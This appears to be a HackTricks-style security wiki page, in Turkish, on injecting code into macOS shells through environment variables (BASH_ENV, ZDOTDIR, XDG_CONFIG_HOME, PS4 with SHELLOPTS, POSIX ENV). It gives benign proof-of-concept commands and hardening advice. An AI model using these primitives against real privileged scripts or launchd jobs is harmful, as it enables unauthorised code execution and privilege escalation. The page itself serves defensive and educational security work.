# macOS Shell Applications Injection

{{#include ../../../banners/hacktricks-training.md}}

## `BASH_ENV`

Bash, bir script veya `-c` komutunu çalıştırmak için etkileşimsiz olarak başlatıldığında, `BASH_ENV` değerini genişletir ve istenen komutu çalıştırmadan önce ortaya çıkan dosyayı source eder. Bash bu dosyayı bulmak için `PATH` kullanmaz. Bu nedenle, etkileşimsiz Bash'i saldırgan tarafından kontrol edilen environment variable'larla başlatan bir process'in önce okunabilir bir shell payload'ı çalıştırması sağlanabilir.<sup>[[1]](#references)</sup>
```bash
cat >/tmp/bash-startup-hook.sh <<'EOF'
#!/bin/bash
/usr/bin/touch /tmp/bash-env-executed
EOF

BASH_ENV=/tmp/bash-startup-hook.sh /bin/bash -c '/usr/bin/true'
test -e /tmp/bash-env-executed && echo 'BASH_ENV executed'
```
Hook yalnızca hedef gerçekten Bash başlattığında çalışır; başka bir platformdaki `/bin/sh` veya shell olmadan bir komut çalıştıran program bunu mutlaka dikkate almaz. Bash privileged mode'da `BASH_ENV` değişkenini yok sayar. Effective ve real user/group ID'leri farklı olduğunda Bash ayrıca startup files'ları atlar ve `-p` sağlanmadığı sürece effective ID'leri sıfırlar; `-p` ile privileged mode etkin kalır ve `BASH_ENV` yine yok sayılır.<sup>[[1]](#references)[[2]](#references)</sup>

macOS'ta `launchd` jobs, inherited veya per-job environment variables tanımlayabilir; bu nedenle privileged scripts'leri besleyen plist'leri ve launch contexts'leri inceleyin. Interpreter variables'larını temizlemek için yalnızca SIP'e güvenmeyin: minimal bir environment (`env -i`) kullanın, `BASH_ENV`'i açıkça unset edin, amaçlanan interpreter'ı absolute path ile çağırın ve writable startup files kullanmaktan kaçının.

## zsh `ZDOTDIR`

zsh, non-interactive shells dahil her normal shell için `$ZDOTDIR/.zshenv` dosyasını okur; `ZDOTDIR` unset ise `HOME` kullanılır. Bu nedenle `ZDOTDIR`'ı writable bir directory'ye yönlendirmek, `zsh -c` command'i veya script'inden önce `.zshenv` dosyasını çalıştırır.<sup>[[3]](#references)</sup>
```bash
mkdir -p /tmp/zsh-startup
echo '/usr/bin/touch /tmp/zshenv-executed' > /tmp/zsh-startup/.zshenv
ZDOTDIR=/tmp/zsh-startup /bin/zsh -c /usr/bin/true
```
`zsh -f`, `RCS` seçeneğini kaldırır ve bu kullanıcı başlangıç dosyasını atlar. Global `/etc/zshenv` dosyası yine de okunur; bu nedenle güvenilir ve minimal kalmalıdır.

## fish `XDG_CONFIG_HOME`

fish, yalnızca interactive veya login shell'lerde değil, her shell'in başlangıcında `$XDG_CONFIG_HOME/fish/conf.d/*.fish` ve `$XDG_CONFIG_HOME/fish/config.fish` dosyalarını okur. Ayrıca `XDG_DATA_DIRS` içindeki girdilerin altında bulunan `fish/vendor_conf.d/*.fish` dosyalarını da çalıştırır. Bu nedenle bu değişkenlerden birini ve okunabilir bir dizini kontrol eden bir attacker, bir fish script'i veya `-c` komutundan önce code çalıştırabilir.<sup>[[4]](#references)</sup>
```bash
mkdir -p /tmp/fish-startup/fish
echo 'touch /tmp/fish-config-executed' > /tmp/fish-startup/fish/config.fish
XDG_CONFIG_HOME=/tmp/fish-startup fish -c true

# Vendor configuration variant
mkdir -p /tmp/fish-vendor/fish/vendor_conf.d
echo 'touch /tmp/fish-vendor-executed' > /tmp/fish-vendor/fish/vendor_conf.d/10-hook.fish
XDG_DATA_DIRS=/tmp/fish-vendor fish -c true
```
Güvenilir bir çağrı için `fish --no-config` kullanın ve güvenilmeyen XDG path değişkenlerini temizleyin.

## bash `PS4` + xtrace (`SHELLOPTS`)

Bash, **xtrace** seçeneğiyle çalıştığında, izlenen her komuttan önce `PS4` değişkenini genişletir ve yazdırır. `PS4`, herhangi bir prompt gibi genişletilir; bu nedenle içindeki bir **command substitution** çalıştırılır. Hem `PS4` değeri hem de xtrace'in etkinleştirilme şekli tamamen environment üzerinden gelebilir: `SHELLOPTS=xtrace` export etmek, normal bir `bash script.sh` çalıştırıldığında xtrace'i etkinleştirir (`-x` flag'i gerekmez). Bu, victim'ın çalıştırdığı herhangi bir Bash script'ini code execution'a dönüştürür.<sup>[[5]](#references)</sup>
```bash
echo 'x=1; echo done' > /tmp/victim.sh

# Pure environment-variable injection (no -x on the command line)
SHELLOPTS=xtrace PS4='$(id > /tmp/ps4-executed)' bash /tmp/victim.sh
cat /tmp/ps4-executed

# Same primitive when a maintenance/CI job is run with debugging on
PS4='$(touch /tmp/ps4-x)' bash -x /tmp/victim.sh
```
`PS4`, xtrace etkinleştirilene kadar tek başına hiçbir şey yapmaz (`SHELLOPTS=xtrace`, `set -x` veya `bash -x` aracılığıyla). Bash, **privileged mode** içinde `SHELLOPTS`'ı yok sayar (`-p` işleme alınmadan gerçek/etkin kimliklerin farklı olması durumunda); dolayısıyla `BASH_ENV` için geçerli olan setuid uyarıları burada da geçerlidir.

## POSIX `ENV`

POSIX tarzı shell'ler (`/bin/sh`, `dash`, `ksh`), `ENV` değişkenini okur, genişletir ve **interactive** bir shell başlatıldığında ortaya çıkan dosyayı source eder. Bu, `BASH_ENV`'in ( *non-interactive* Bash için etkinleşen) POSIX karşılığıdır; dolayısıyla `ENV` kontrolü, bir victim her `interactive` `sh`/`dash` başlattığında code execution sağlar.
```bash
echo 'touch /tmp/env-executed' > /tmp/env-hook.sh
echo 'exit' | ENV=/tmp/env-hook.sh dash -i
test -e /tmp/env-executed && echo 'ENV executed'
```
## References

- [1] [Bash Başlangıç Dosyaları](https://www.gnu.org/software/bash/manual/html_node/Bash-Startup-Files)
- [2] [Bash'i Çağırma](https://www.gnu.org/software/bash/manual/html_node/Invoking-Bash.html)
- [3] [zsh Başlangıç/Kapanış Dosyaları](https://zsh.sourceforge.io/Doc/Release/Files.html#Startup_002fShutdown-Files)
- [4] [fish Yapılandırma dosyaları](https://fishshell.com/docs/current/language.html#configuration-files)
- [5] [Bash Değişkenleri — `PS4` ve Set Builtin (`xtrace`/`SHELLOPTS`)](https://www.gnu.org/software/bash/manual/html_node/Bash-Variables.html)
{{#include ../../../banners/hacktricks-training.md}}
